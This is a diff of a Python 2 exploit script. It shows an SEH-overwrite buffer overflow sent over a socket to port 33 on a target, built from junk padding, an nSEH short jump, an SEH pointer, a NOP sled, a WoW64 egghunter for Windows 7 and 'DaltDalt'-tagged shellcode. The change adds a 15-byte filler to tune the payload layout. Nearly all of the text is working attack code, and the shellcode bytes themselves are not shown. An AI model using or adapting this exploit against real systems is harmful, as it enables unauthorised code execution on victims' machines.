@@ -9,9 +9,11 @@ socket.connect((ip , 33))
 
 # evil = "A"* 330
 junk = "A" * 50
+morejunk = "B" * 15
 nseh = "\xeb\x06\x90\x90"
 seh = "\xdb\x65\x41\x00" #004165db
 nops = "\x90"*100
+
 
 #modern egghunter for wow64 - Windows 7
 eggh = (
@@ -89,7 +91,7 @@ shellcode = (
 
 # Shellcode length = 257 bytes
 # payload = "DaltDalt" + shellcode + nseh + seh + nops + eggh
-payload = junk + "DaltDalt" + shellcode + nseh + seh + nops + eggh
+payload = junk + "DaltDalt" + shellcode + morejunk + nseh + seh + nops + eggh
 socket.send(payload)
 d = socket.recv(1024)
 print d
